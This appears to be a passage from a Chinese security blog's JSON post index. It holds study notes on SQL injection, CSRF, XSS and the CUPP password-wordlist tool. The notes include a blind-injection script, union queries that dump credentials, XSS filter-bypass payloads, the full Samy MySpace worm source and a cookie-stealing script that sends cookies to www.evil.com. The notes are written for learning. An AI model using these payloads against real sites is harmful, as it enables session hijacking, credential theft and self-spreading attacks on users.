break\n\n```\n\n得到表名\n\n![image-20200416221001579](/images/image-20200416221001579.png)\n\n继续看wp，又学到无列名注入，参考：<a href=\"https://zhuanlan.zhihu.com/p/98206699?utm_source=wechat_session\">二向箔安全学院无列名注入</a>\n\n颖奇L'Amore师傅的脚本：\n\n```python\n'''\nAuthor: 颖奇L'Amore\nBlog: www.gem-love.com\n本文链接： https://www.gem-love.com/ctf/1669.html\n'''\nimport requests\nurl = 'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/'\n\ndef trans(flag):\n    res = ''\n    for i in flag:\n        res += hex(ord(i))\n    res = '0x' + res.replace('0x','')\n    return res\n\nflag = ''\nfor i in range(1,500): #这循环一定要大 不然flag长的话跑不完\n    hexchar = ''\n    for char in range(32, 126):\n        hexchar = trans(flag+ chr(char))\n        payload = '2||((select 1,{})>(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar)\n        data = {\n                'id':payload\n                }\n        r = requests.post(url=url, data=data)\n        text = r.text\n        if 'Nu1L' in r.text:\n            flag += chr(char-1)\n            print(flag)\n            break\n```\n\n得到flag\n\n\n\n#### 总结\n\n1.information_schema无法使用时使用sys.x$schema_flattened_keys替代，另外还可使用mysql.innodb_table_stats显示更多表：\n\n![image-20200416223908444](/images/image-20200416223908444.png)\n\n2.无列名注入，还有待学习\n\n3.mysql小tips：MySQL遇到hex会自动转成字符串，所以脚本进行了hex()操作。\n\n4.想像大佬们一样写脚本\n\n","tags":["sql"],"categories":["CTF"]},{"title":"SQL学习日记","url":"/2020/01/15/note6/","content":"## SQL注入\n### 1.概念及原理\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，之后再将这些参数传递给后台的SQL服务器加以解析并执行，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。(百度百科)<!-- more -->\n### 2.注入类型\n##### 参考文章`https://www.cnblogs.com/zyh0430/p/11202429.html`\n### 3.sql基本流程\n假设当前URL为`http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1`\n(1)输入单引号 ‘ 进行检验是否存在输入\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 ‘\n```\n(2)检验是字符型还是数字型\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php?  id=1%  and 1=2\n```\n   报错即为数字型\n(3)查看这个网站所错在的表有几列\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 order by 3\n```\n使用二分法，如果输入错误则报错，如果存在就维持原状。\n(4)进行 union select联合查询\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,3 %23\n```\n(5) 输入 version() 发现输出位查询数据库版本号\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,version() %23\n```\n(6)查询数据库所拥有的表名\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php?id=-1 union select1,2,group_concat(table_name)from information_schema.tables where table_schema = database() %23\n```\n(7)查询出users表里的列名\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,group_concat(column_name)%20from information_schema.columns where table_schema = database() and table_name =\"users\"%23\n```\n(8)查出users表中username列中用户名\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(username) from security.users %23\n```\n(9)查出user表中的password列中密码\n\n```bash\nhttp://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(password) from security.users %23\n```\n### sql注入实例(ctf)\n“百度杯”CTF比赛 九月场SQLi\n\n```bash\nhttps://blog.csdn.net/weixin_40709439/article/details/82027422\n```\n“百度杯”CTF比赛 九月场SQL\n\n```bash\nhttps://www.jianshu.com/p/0a82851bb1c2\n```\n\n","tags":["sql"],"categories":["web安全"]},{"title":"xss学习日记(五）","url":"/2019/11/06/note5/","content":"\n## CSRF(跨站请求伪造)\n全称Cross-site request forgery，是一种利用网站对用户网页浏览器的信任来挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<!-- more -->\n##### 原理\n当下的web应用大都使用cookie来识别用户身份，只要不退出或者关闭浏览器，以后访问该网站下的页面的时候，对于用户的每一个请求，Web浏览器都会主动附带该网站的cookie来标识身份，如此用户就不需要重新认证就可以被网站识别。\n这时如果从第三方web页面发起对当前网站域下的请求，该请求也会带上当前网站的cookie（包括对Web页面中任意文件如IMG的请求），这种认证方式称之为隐式认证，攻击者正是利用该缺陷实施CSRF攻击。\n##### 示意图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20191106200247637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n##### 常见CSRF方式\n```bash\n1.<img>标签属性\n<img src=\"http://www.te***.com/?command\">\n2.<script>标签属性\n<script src=\"http://www.test.com/?command\">\n3.<iframe>\n<iframe src=\"http://www.te***.com/?command\">\n4.JavaScript对象\n（1）<script>\n\tvar foo = new Image () ;\n\tfoo.src = \"http: / /www. te*** . com/ ?command\";\n\t</script>\n（2）XMLHTTP\n<script>\n\tvar post_data = ' name-value ' ;\n\tvar xmlhttp=new ActiveXobject ( \"Microsoft. XMLHTTP\") ;\n\txmlhttp. open (\"POST\", 'http:/ / www. te*** . com/file.ext', \t\t\ttrue):\n\txmlhttp. onreadystatechange = function () \n\t{if (xmlhttp. readyState == 4)\n\t\t{\n     \t alert (xmlhttp. responseText) ;      \n\t\t}\n\t};\n\txmlhttp.send(post_data) ;\n</script>\n```\n#### 攻击实例\n推荐文章：https://www.2cto.com/article/201310/248996.html\n\n","tags":["CSRF"],"categories":["web安全"]},{"title":"一个字典生成工具","url":"/2019/11/06/note7/","content":"\n在逛论坛的时候偶然看到一个字典生成工具，叫CUPP，感觉挺有意思，于是在github上D下来试试看<!-- more -->，github上搜索即得\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109200732805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)用python3运行脚本cupp.py显示帮助\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020010920105938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)-h此菜单\n\n-i有关用户密码分析的交互式问题\n\n-w使用此选项来配置现有字典，\n\n或WyD.pl输出以制作一些pwnsauce\n\n-l从存储库下载巨大的单词列表\n\n-a直接从Alecto DB解析默认的用户名和密码。\n\nProject Alecto使用Phenoelit和CIRT的纯化数据库，这些数据库经过合并和增强。\n\n-v程序版本\n我试验了使用cupp.py -i通过个人信息生成字典，这里可以看到它通过一些个人相关问题来收集信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109201934957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)输入相关信息后自动生成字典在文件目录下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200109202048701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)拿自己的个人信息试了一下，发现了我一些账号的弱密码，再次感受到信息泄露的可怕，同时，它提醒我是时候把自己的那些弱密码账号清理掉了。\n\n","tags":["信息搜集"],"categories":["tool"]},{"title":"xss学习日记(四）","url":"/2019/11/04/note4/","content":"\n## XSS漏洞发掘\n\n#### 记录几种发掘xss漏洞的方法<!-- more -->\n#### 主要有三种方法：白盒测试，黑盒测试，灰盒测试\n#### 1.自动化测试工具(黑盒)\n使用专业的xss漏洞自动化测试工具，能够快速有效的发掘漏洞，如Ratproxy(http://code.google.com/p/ratproxy/)\n#### 2.手动测试(黑盒)\n人工测试主要是配合查看客户端的HTML源文件发掘xss,输入`“<script>alert(0)</script>”`等XSS攻击字符串并提交给应用程序的每个参数，然后监控这个输入的响应。如果目标程序没有对攻击字符串做出过滤,消毒和转义处理，就可以确认应用程序存在xss漏洞。\n例如，如果针对页面的输入框进行测试，首先可以输入一些能触发xss的敏感字符，如：<\t>\t\"\t'\t&\t#，如果这些基本字符都未被转义，则该输入框大概率存在xss漏洞，我们就可以再借此构造完整的xss代码进行测试。\n或者我们也可以直接输入以下完整的xss代码进行尝试，如：\n\n```bash\n<script>alert(document.cookie);</script>\n \n\"><script>alert(document.cookie);</script>\n \n=\"><script>alert(document.cookie);</script>\n \n<IMG src=\"javascript:alert('XSS');\">\n\n```\n如果提交后发现页面出现排版问题或者JS错误，也说明这个输入框可能存在XSS漏洞。\n关于这个方法，由安全研究者Rsanke维护的XSS语句列表中持续更新最新的xss语句，大家可以参考测试web应用程序是否存在xss漏洞。\n传送：http://ha.ckers.org/xss.html\n#### 2.源代码安全审计(白盒）\n这里的源代码指的是web服务端的程序代码，如ASP,JSP,PHP等。\n一般思路是：查找可能咋页面输出的变量，检验他们是否受到控制，然后跟踪这些变量的传递过程，分析他们是否被HTMLlencode()之类的函数过滤。\n推荐一个大佬的操作实例，传送门：https://www.freebuf.com/articles/web/186163.html\n\n#### 3.JavaScript代码分析\n由于Javascript功能强大，能控制Web客户端的逻辑，甚至能操作用户的输入与输出。在这个过程中，如果用户的恶意输入没有被正确处理就可能产生XSS。\n记录一种特别的XSS---DOM-Based XSS.\n前面的学习已经提到，DOM-Based XSS是基于DOM文档对象模型的一种漏洞，受客户端浏览器的脚本代码所影响。\n记录一个例子：假设有如下代码：\n\n```bash\n<html>\n <head>\n  <title> DOM-XSS test </title>\n </head>\n <body>\n \t<script>\n \t\tvar a=document.URL;\n \t\t\tdocument.write(a.substring(a,indexOf(\"a=\")+2,a.length));\n \t\t</script>\n  </body>\n </html>\n```\n将以上代码保存在domXSS.html,中，然后用浏览器访问：\n\n```bash\nhttp://127.0.0.1/domXSS.html?a=test\n```\n页面打印出test信息，上述代码在解析URL过程中直接提取出a参数的值，并把这个值写入页面的HTML源代码中。\n然而，攻击者可能会以Javascript代码作为a的参数的值，导致这段代码被动态的写入页面中。如构造一个恶意的请求地址：\n\n```bash\nhttp://127.0.0.1/domXSS.html?a=<script>alert('xss')</script>\n```\n当访问以上地址时，服务器返回包含上面脚本的HTML静态文本，浏览器会把HTML文本解析成DOM，并向服务器返回代码一样执行。结果如下图：\n![1](https://img-blog.csdnimg.cn/20191104210540934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n由此可见，DOM XSS受客户端脚本代码的影响，分析客户端Javascript的方式，便能发掘出基于XSS的漏洞。\n\n国外安全研究员Amit Klein发表的一篇论文中详细的讲述了DOM-Based XSS的许多概念和技术，还列举了许多可能触发改漏洞的DOM对象，附上传送门：\nhttp://www.webappsec.org/projects/articles/071105.html\n\n","tags":["xss"],"categories":["web安全"]},{"title":"xss学习日记(三）","url":"/2019/11/02/note3/","content":"\n### XSS蠕虫\n\n#### 基本概念\nXSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)<!-- more -->\n当xss蠕虫与社会工程学相结合，其危害性将变得十分可怕（用户兴趣点及好奇心）。\n\n#### 原理\n1.攻击者发现一个网站存在XSS漏洞，并且可以编写xss蠕虫。\n2.利用一个宿主（用户）作为传播源头进行xss攻击。\n3.当其他用户访问被感染的内容（页面），xss蠕虫执行以下操作。\n  A 判断用户是否登录，如果已经登陆就执行下一步，如果没有登录则执行其他操作。\n  B 继续判断该用户是否被感染，如果没有就感染了他，如果感染了就跳过。\n#### 构建过程\n1.寻找XSS点\n2。实现蠕虫行为\n3.收集蠕虫数据\n4.传播与感染\n参考文章https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db\n  #### 世界上第一个xss蠕虫病毒(里程碑)\n  2005年10月4日，第一个web2.0 蠕虫诞生，年仅19岁的samy发起了对myspace.com的xss worm攻击，下附其源代码，实现方法及原理分析参考文章\n  https://www.freebuf.com/articles/web/19408.html\n```bash\n  <div id=mycode style=\"BACKGROUND:url('java \nscript:eval(document.all.mycode.expr)')\"expr=\"var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g(){varC;try{varD=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return\nC}else{return eval('document.body.inne'+'rHTML')}}function\ngetData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){varE=document.location.search;var F=E.substring(1,E.length).split('&');var AS=new Array();for(varO=0;O<F.length;O++){varI=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}functiongetClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}functionparamsToString(AV){var N=new\nString();var O=0;for(var P\nin AV){if(O>0){N+='&'}varQ=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){Q=Q.replace('&','%26')}N+=P+'='+Q;O++}return\nN}function httpSend(BH,BI,BJ,BK){if(!J){return\nfalse}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return\ntrue}function findIn(BF,BB,BC){varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))}functiongetHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else\nif(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=newActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return\nZ}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='\nbut most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'}var AG;function getHome(){if(J.readyState!=4){return}varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','</td>');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var\nAR=getFromURL(AU,'Mytoken');var\nAS=new\nArray();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',paramsToString(AS))}}}functionpostHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var\nAS=new\nArray();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function\nmain(){var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='+L,processxForm,'GET')}functionprocessxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var\nAS=new\nArray();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to\nFriends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function\nhttpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return\nfalse}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return\ntrue}\"></DIV>\n```\n\n  \n\n","tags":["xss"],"categories":["web安全"]},{"title":"xss学习日记(二）","url":"/2019/11/01/note2/","content":"\n## xss构造剖析\n#### 1.XSS-filter\n为了防御跨站脚本攻击。开发人员会在web应用中设计一个XSS Filter,即**跨站脚本过滤器**，用于分析用户提交的输入，并消除潜在的跨站脚本攻击，恶意的HTML或简单的HTML格式错误等<!-- more -->\n它实际上是一段精心编写的过滤函数，下列是phpcms中的过滤代码文件global.func.php中的一段代码\n\n```bash\n    $parm1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');\n\n\n    $parm2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');\n\n\n    $parm = array_merge($parm1, $parm2); \n\n\n for ($i = 0; $i < sizeof($parm); $i++) { \n\n $pattern = '/'; \n\n for ($j = 0; $j < strlen($parm[$i]); $j++) { \n\n if ($j > 0) { \n\n $pattern .= '('; \n\n $pattern .= '(&#[x|X]0([9][a][b]);?)?'; \n\n $pattern .= '|(&#0([9][10][13]);?)?'; \n\n $pattern .= ')?'; \n\n }\n\n $pattern .= $parm[$i][$j]; \n\n }\n\n $pattern .= '/i';\n\n $string = preg_replace($pattern, ' ', $string); \n\n }\n\n return $string;\n\n}\n```\n这段代码的作用是过滤XSS跨站代码，程序在处理输入变量时使用该函数，就可过滤常见的跨站脚本。\n但它依旧存在被绕过的可能，下列从攻的角度展示一些绕过XSS Filter的测试用例。\n#### (1)利用<>标记注射Html/Javascript\n如`<script>alert;</script>或<script>shellcode</script>`\n因此，XSS Filter最先要进行过滤和转义的就是“<>”和`<script>`等字符。\n###### (2)利用HTML标签属性值执行XSS。\n如下代码:\n\n```bash\n<table background=\"javescript:alert(/XSS/)\"></table>\n<img scr=\"javescript:alert('XSS')\">\n```\n在IE6浏览器中运行上述代码会弹出对话框，即攻击成功，但它具有一定的局限性，即只能在支持javascript:[code]伪协议的浏览器运行。\n通常只有引用文件的属性才能触发跨站脚本，我们可以使用以下属性来测试XSS\n\nhref=\n\nlowsrc=\n\nbgsound=\n\nbackground=\n\nvalue=\n\naction=\n\ndynsrc=\n所以，要防御基于属性值的XSS，就要过滤javascript等关键字，另外还有其他允许值如Vbscript\n（3）空格回车Tab\n\nXSS Filter把敏感的输入字符列入黑名单处理，可以利用空格、回车和Tab键绕过 例：\n\n<img src=\"javas\n\nscript:\n\nalert(/xss/)\">\n#### (4）对标签属性值转码\n\n对普通HTML标记的属性值过滤，还可以通过编码处理来绕过。\n\nTab符的ASCII码&#9、换行符&#10、回车符&#13可以插入任意地方\n\n为了防范标签纸属性编码的XSS，最好也过滤&#/等字符\n\n#### (5）产生自己的事件\n\n不能依靠属性值跨站，通过事件，如click、mouseover、load等，响应事件的函数叫事件处理函数例：\n\n```bash\n<img src=\"#\" onerror=alert(/xss/)>\n```\n\nonerror是IMG标记的一个事件，页面发生错误，该事件被激活。上例，解释IMG标记时，加载src属性引用的图片地址，若图片不存在就触发onerror事件。其他事件：onResume\n\nonReverse\n\nonRowDelete\n\nonRowInseted\n等\n#### (6）利用CSS跨站\n\nCSS中使用expression同样可以触发XSS。例：\n\n<div style=\"width: expression(alert('xss'));\">\n\n脚本代码通常被嵌入到style标签/属性中。style属性可以和任意字符的标签结合，所以不只要过滤标签，还必须对style属性值进行过滤。\n\n例:\n\n```bash\n<div style=\"list-style-image:url(javascript:alert(‘xss’))\">\n\n<img style=\"background-image:url(javascript：alert('xss'))\">  等同于\n\n<img src=\" javascript:alert('xss')\">\n```\n此外，可以使用<link>标签引用CSS，除<link>标签外，网页中引用外部CSS还可以利用@import导入，例：\n\n```bash\n<style type='test/css'/>import url(http://.../xss.css);</style>\n```\n@import还可以直接执行JS代码\n\n```bash\n<style>\n\n@import 'javascript:alert(\"xss\")';\n\n</style>\n```\n因此，包含expression、javascript、import等敏感字符的样式表也要进行过滤。\n\n#### (7）扰乱过滤规则\n\n转换大小写、大小写混淆、不用双引号用单引号、不使用引号。IMG标记和src属性之间没有空格\n\n```bash\n<img/src=\"javascript:alert('xss');\">\n```\n利用expression跨站时，可以构造不同的全角字符。\n运用/**/来注释字符，样式标签中的\\和结束符\\0。\n将CSS关键字转码，e转\\65，改变编码中0的数量\\065、\\0065\n利用浏览器解析HTML注释存在的问题来执行JS，例：\n```bash\n<!--<img src=\"--><img src=x onerror=alert(1)//\">\n```\n纯文本标签造成的混乱标记，例：\n\n```bash\n<style><img src=\"</style><img src=x onerror=alert(1)//\">\n```\n#### 利用字符编码\n字符编码在跨站脚本中经常用到，透过这种技巧，不仅能让XSS绕过服务端的过滤，还能更好的隐藏shellcode\n具体内容推荐博客\nhttps://blog.csdn.net/Fly_hps/article/details/82944455\n","tags":["xss"],"categories":["web安全"]},{"title":"xss学习日记(一)","url":"/2019/10/26/note1/","content":"\n#### 1.基本概念  \n\nXSS（Cross Site Scripting）攻击全称跨站脚本攻击，是一种通过注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序，从而获取更高的权限、私密网页内容、会话和cookie等各种内容的计算机安全漏洞。 恶意网页程序包括JavaScript、Java、HTML等。<!-- more -->\n#### 2.类型\n###### xss攻击可以分成两大类：\n(1)非持久型攻击：一次性，仅对当次的页面访问产生影响。用户访问一个被攻击者篡改后的链接后，被植入的攻击脚本被游览器执行，从而达到攻击目的。\n(2)持久型攻击：攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。\n###### 常见的三种XSS攻击类型\n1.反射型(非持久 后端)： \n通过浏览器直接“反射”给用户，例如攻击者提前构造一个恶意链接，来诱使用户点击，比如这样的一段链接：`www.abc.com/?params=<script>alert(/xss/)</script>。 `\n2.存储型(持久 后端)： \n黑客输入的恶意脚本存储在服务器的数据库中。当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。一个场景是攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。 \n3.DOM Based XSS(持久 前端)：\n一种利用前端代码漏洞进行攻击的攻击方式，前面的反射型XSS与存储型XSS本质都是利用后端代码的漏洞，payload在响应页面中。DOM Based payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。\n例如提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。\n\n##### 一个例子\n本地服务器的的/xssTest 目录下，有一个test.php文件，代码如下：\n\n```php\n<?php\n    $userName=$_GET['userName'];                    //获取用户输入的参数\n    echo \"<b>\".$userName.\"</b>\";                    //直接输出用户的参数给前端页面\n?>\n```\n正常情况下，用户提交的姓名可以正确显示在页面上，不会构成XSS攻击，比如，当用户访问以下URL：\n```bash\nhttp://localhost/xssTest/test.php?userName=jack`\n```\n页面会显示：\n![1](https://img-blog.csdnimg.cn/2019103121021226.png)\n可以看到，用户在URL中输入的参数正常显示在页面上。然后，我们在URL中插入JavaScript代码，如：\n\n```bash\nhttp://localhost/xssTest/test.php?userName=<script>window.open(http://www.baidu.com)</script>\n```\n则页面会显示：\n![2](https://img-blog.csdnimg.cn/20191031210340900.png)\n可以看到，页面没有把userName后面的内容显示出来，而且打开了一个新的标签页,原因是在URL中带有一段打开另一标签页的恶意脚本。\n这个例子体现了最简单的XSS攻击的完整流程。\n###### XSS Payload\n我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以**JavaScript可以做什么，XSS攻击就可以做什么。**\n一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，意味着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。\n如下所示，攻击者先加载一个远程脚本：\n\n```bash\nhttp://localhost/xssTest/test.php?userName=<scriipt src=http://www.evil.com/evil.js></script>\n```\n而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：\n\n```bash\nvar img=document.createElement(\"img\");\nimg.src=\"http://www.evil.com/log?\"+escape(document.cookie);  \ndocument.body.appendChild(img);\n```\n这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。\n###### 参考文献来自于百度，csdn,博客园，个人博客站点等\n###### 推荐文章 https://www.cnblogs.com/Renyi-Fan/p/9951407.html\n","tags":["xss"],"categories":["web安全"]}]